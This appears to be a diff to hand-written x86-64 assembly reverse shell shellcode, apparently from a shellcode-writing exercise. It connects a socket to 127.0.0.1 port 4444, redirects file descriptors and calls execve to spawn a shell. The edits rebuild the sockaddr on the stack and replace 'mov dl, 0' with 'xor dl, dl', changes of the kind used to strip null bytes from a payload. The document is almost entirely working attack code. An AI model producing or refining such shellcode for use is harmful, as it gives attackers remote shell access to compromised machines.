@@ -17,8 +17,9 @@ _start:
 	xchg edi, eax		; sockfd = 32 bit file descriptor returned from socket syscall
 	mov al, 42		; syscall = connect
 	push rdx		; pad 8 null bytes to align with sockaddr
-	mov rsi, 0x0100007f5c110002	; sin_addr = 127.0.0.1, sin_port = 4444, sin_family = AF_INET, reversed for little endian
-	push rsi		; push sockaddr to stack
+	push dword 0x0100007f   ; sin_addr = 127.0.0.1, reversed for little endian
+	push word 0x5c11	; sin_port = 4444
+	push word 2		; sin_family = AF_INET
 	mov rsi, rsp		; sockaddr = structure in the stack
 	mov dl, 16		; addrlen = 16 bytes
 	syscall
@@ -46,6 +47,6 @@ dup2Loop:
 	mov rdi, rsp		; set first arg to pathname pointer
 	push rax		; push another null terminator	
 	mov rsi, rsp		; set second arg to pathname pointer
-	mov dl, 0	    	; envp = NULL 
+	xor dl, dl	    	; envp = NULL 
 	mov al, 59		; syscall = execve
 	syscall
